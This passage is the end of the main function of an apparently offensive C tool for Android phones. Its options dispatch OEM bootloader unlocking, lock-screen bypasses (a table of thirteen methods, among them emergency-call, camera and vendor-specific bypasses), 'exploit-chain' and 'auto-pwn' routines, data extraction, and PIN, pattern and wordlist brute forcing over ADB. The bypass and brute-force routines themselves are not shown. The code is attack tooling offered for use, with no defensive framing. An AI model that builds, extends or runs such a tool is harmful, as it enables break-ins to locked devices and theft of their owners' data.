                fb_getvar_all(&fe);
                fb_print_info(&fe);
                if (fe.boot_unlocked)
                    printf(GREEN "[+] Bootloader already unlocked!\n" RESET);
                else {
                    printf(YELLOW "[*] Attempting OEM unlock...\n" RESET);
                    if (fb_oem_unlock(&fe))
                        printf(GREEN "[+] Bootloader unlocked!\n" RESET);
                }
            } else {
                printf(RED "[-] No fastboot device found.\n" RESET);
            }
            return 0;
        }
        else if (!strcmp(argv[i], "--ls-bypass")) {
            LockScreenBypass lsb;
            ls_init(&lsb);
            if (adb_init() && adb_state() >= 2) {
                DeviceInfo lsinfo;
                safe_detect_all(&lsinfo);
                strncpy(lsb.model, lsinfo.model, sizeof(lsb.model)-1);
                strncpy(lsb.android_version, lsinfo.android, sizeof(lsb.android_version)-1);
                if (ls_full_bypass(&lsb))
                    printf(GREEN "\n[+] LOCK SCREEN BYPASSED!\n" RESET);
                ls_print_methods(&lsb);
            } else
                printf(RED "[-] ADB required.\n" RESET);
            return lsb.any_success ? 0 : 1;
        }
        else if (!strcmp(argv[i], "--ls-method") && i+1 < argc) {
            int method_id = atoi(argv[++i]);
            LockScreenBypass lsb;
            ls_init(&lsb);
            if (adb_init() && adb_state() >= 2) {
                DeviceInfo lsinfo;
                safe_detect_all(&lsinfo);
                strncpy(lsb.model, lsinfo.model, sizeof(lsb.model)-1);
                strncpy(lsb.android_version, lsinfo.android, sizeof(lsb.android_version)-1);
                ls_detect_lock_type(&lsb);
                ls_check_vulnerabilities(&lsb);
                /* Run specific method by enum */
                typedef int (*ls_method_fn)(LockScreenBypass*);
                ls_method_fn methods[] = {
                    ls_emergency_call_bypass, ls_camera_bypass, ls_accessibility_bypass,
                    ls_system_ui_tuner_bypass, ls_power_menu_bypass, ls_notification_bypass,
                    ls_google_now_bypass, ls_voice_assistant_bypass,
                    ls_samsung_emergency_bypass, ls_xiaomi_vuln_bypass,
                    ls_oppo_engineering_bypass, ls_vivo_vuln_bypass, ls_huawei_vuln_bypass
                };
                if (method_id >= 1 && method_id <= (int)(sizeof(methods)/sizeof(methods[0])))
                    methods[method_id - 1](&lsb);
                if (lsb.any_success)
                    printf(GREEN "\n[+] LOCK SCREEN BYPASSED via method %d!\n" RESET, method_id);
                ls_print_methods(&lsb);
            } else
                printf(RED "[-] ADB required.\n" RESET);
            return lsb.any_success ? 0 : 1;
        }
        else if (!strcmp(argv[i], "--hardware-probe")) {
            return hwprobe_run();
        }
        else if (!strcmp(argv[i], "--data-forensics")) {
            return forensics_extract();
        }
        else if (!strcmp(argv[i], "--exploit-chain")) {
            return chain_run();
        }
        else if (!strcmp(argv[i], "--neural-gen") && i+2 < argc) {
            int d = atoi(argv[++i]);
            int c = atoi(argv[++i]);
            char buf[65536];
            int n = neural_gen_pins(d, c, buf, sizeof(buf));
            printf("[*] Generated %d candidates (%d-digit):\n%s", n, d, buf);
            return 0;
        }
        else if (!strcmp(argv[i], "--security-bypass")) {
            return secbypass_run();
        }
        else if (!strcmp(argv[i], "--auto-pwn")) {
            return auto_pwn_run();
        }
        else if (!strcmp(argv[i], "--deep-scan-adb")) {
            DeviceInfo info;
            memset(&info, 0, sizeof(info));
            if (!adb_init() || adb_state() < 2) {
                fprintf(stderr, "ADB_FAIL\n");
                return 1;
            }
            safe_detect_all(&info);
            print_full_info(&info);
            /* Also show deep hardware scan */
            auto_pwn_scan_full(NULL, 0);
            return 0;
        }
    }

    if (!quiet) banner();

    if (list_mode) {
        printf("[*] Scanning USB...\n");
        int n = usb_scan_devices();
        if (n > 0) printf("[+] %d Android device(s) detected.\n", n);
        else printf("[-] No Android devices found.\n");
        return 0;
    }

    if (bypass_mode) {
        printf("[*] Checking bypass vectors...\n");
        if (!device_connected()) {
            fprintf(stderr, "[-] No device connected.\n");
            return 1;
        }
        DeviceInfo info;
        safe_detect_all(&info);
        printf("\n" BOLD "=== Bypass Vectors ===" RESET "\n");
        print_bypass_info(&info);
        return 0;
    }

    if (info_mode || full_mode) {
        loading_dots("[*] Connecting to device", 3);
        if (!device_connected()) {
            fprintf(stderr, "\r[-] No device connected.\n");
            return 1;
        }
        printf("\r[+] Device connected.\n");
        DeviceInfo info;
        safe_detect_all(&info);
        print_full_info(&info);
        return 0;
    }

    int plen = 0;
    if (auto_mode) {
        return autorun_main(delay, start, end, resume);
    }

    if (direct_mode || (mode > 0 && mode != 99 && mode != 'p' && mode != 'w')) {
        if (!device_connected()) {
            loading_dots("[*] Waiting for device", 5);
            if (!adb_init()) return 1;
            if (!adb_wait(10)) { fprintf(stderr, "\r[-] No device.\n"); return 1; }
        } else {
            loading_spinner("[*] Initializing ADB", 2);
            if (!adb_init()) return 1;
            if (!adb_check()) { fprintf(stderr, "\r[-] ADB lost.\n"); return 1; }
        }
        printf("\r[+] Device ready. "); fflush(stdout);
        printf("[*] %d-digit PIN brute force\n", mode);
        return brute_pin(mode, delay, start, end, resume, 0) ? 0 : 1;
    }

    if (!device_connected()) {
        fprintf(stderr, "[-] No device. Use -W to wait or try --auto.\n");
        return 1;
    }

    if (!adb_init()) return 1;
    if (!adb_check()) { fprintf(stderr, "[-] ADB lost.\n"); return 1; }

    DeviceInfo info;
    safe_detect_all(&info);

    if (!mode) {
        fprintf(stderr, "[-] Specify mode: 4-10, auto, smart, pattern, or w\n");
        return 1;
    }

    if (mode == 99) {
        print_full_info(&info);
        if (!verify_device(&info)) return 1;
        if (!info.locked) { printf("[+] Device not locked.\n"); return 0; }
        plen = (info.pin_len == 4 || info.pin_len == 6 || info.pin_len == 8)
                ? info.pin_len : 4;
        printf("\n[*] Smart mode: %d-digit\n", plen);
        return brute_smart(&info, plen, delay) ? 0 : 1;
    }

    if (mode == 'p') {
        print_full_info(&info);
        if (!verify_device(&info)) return 1;
        if (!info.locked) { printf("[+] Device not locked.\n"); return 0; }
        return brute_pattern(&info, delay) ? 0 : 1;
    }

    if (mode == 'w') {
        if (!*wordlist) { fprintf(stderr, "[-] Wordlist: -f <path>\n"); return 1; }
        print_full_info(&info);
        if (!verify_device(&info)) return 1;
        plen = choose_pin_len(&info);
        printf("\n[*] Wordlist brute (%d-digit)...\n", plen);
        return brute_wordlist(wordlist, delay, start, end, resume) ? 0 : 1;
    }

    print_full_info(&info);
    if (!verify_device(&info)) return 1;

    if (!info.locked) { printf("[+] Device not locked.\n"); return 0; }

    plen = (mode >= 1 && mode <= 10) ? mode : choose_pin_len(&info);
    if (plen == 99) {
        plen = (info.pin_len == 4 || info.pin_len == 6 || info.pin_len == 8)
                ? info.pin_len : 4;
        printf("\n[*] Smart mode: %d-digit\n", plen);
        return brute_smart(&info, plen, delay) ? 0 : 1;
    }
    printf("\n[*] Launching %d-digit brute force...\n", plen);
    return brute_pin(plen, delay, start, end, resume, 0) ? 0 : 1;
}
